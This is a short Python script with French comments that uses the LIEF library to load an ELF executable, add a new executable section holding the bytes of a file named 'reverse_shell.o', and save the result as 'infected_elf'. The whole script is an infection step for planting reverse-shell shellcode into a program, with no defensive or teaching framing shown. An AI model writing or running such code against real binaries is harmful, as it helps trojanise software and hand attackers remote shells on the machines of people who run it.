import lief

# Charger l'ELF cible
binary = lief.parse("simple_elf")

# Créer une nouvelle section pour le shellcode
section = lief.ELF.Section(".shellcode")
section.content = list(open("reverse_shell.o", "rb").read())
section.type = lief.ELF.SECTION_TYPES.PROGBITS
section.flags = lief.ELF.SECTION_FLAGS.EXECINSTR

# Ajouter la section au binaire
binary.add(section)

# Sauvegarder le binaire infecté
binary.write("infected_elf")
